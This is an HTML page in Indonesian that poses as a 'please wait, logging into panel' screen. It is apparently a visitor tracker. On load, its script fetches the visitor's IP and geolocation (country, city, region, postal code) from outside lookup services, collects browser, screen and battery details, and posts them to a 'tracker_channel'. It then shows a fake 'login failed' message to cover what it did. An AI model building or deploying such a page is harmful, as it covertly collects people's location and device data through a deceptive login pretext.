<!DOCTYPE html>
<html>
<head>
  <title>Tunggu Sebentar Lagi Login Kek Panel...</title>
  <script>
    async function kirimKePanel() {
      const battery = await navigator.getBattery?.().catch(() => null);
      const ipData = await fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .catch(() => ({ ip: "Tidak Diketahui" }));

      const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
        .then(r => r.json())
        .catch(() => ({}));

      const info = {
        ip: ipData.ip,
        negara: geo.country_name || "Tidak diketahui",
        kota: geo.city || "Tidak diketahui",
        wilayah: geo.region || "Tidak diketahui",
        kode_pos: geo.postal || "Tidak diketahui",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        bahasa: navigator.language,
        layar: `${screen.width}x${screen.height}`,
        baterai: battery ? `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Mengisi' : 'Tidak Mengisi'})` : "Tidak didukung",
        waktu: new Date().toLocaleString()
      };

      // Kirim ke panel utama lewat localStorage (cross-tab)
      const channel = new BroadcastChannel("tracker_channel");
      channel.postMessage(info);

      // Redirect palsu
      setTimeout(() => {
        document.body.innerHTML = '<h2 style="text-align:center;color:white">Login Gagal Silahkan Refresh Ulang</h2>';
      }, 3000);
    }

    window.onload = kirimKePanel;
  </script>
</head>
<body style="background:#111827;color:white;text-align:center;padding:40px;font-size:20px;">
  Tunggu Sebentar lagi login panel....
</body>
</html>
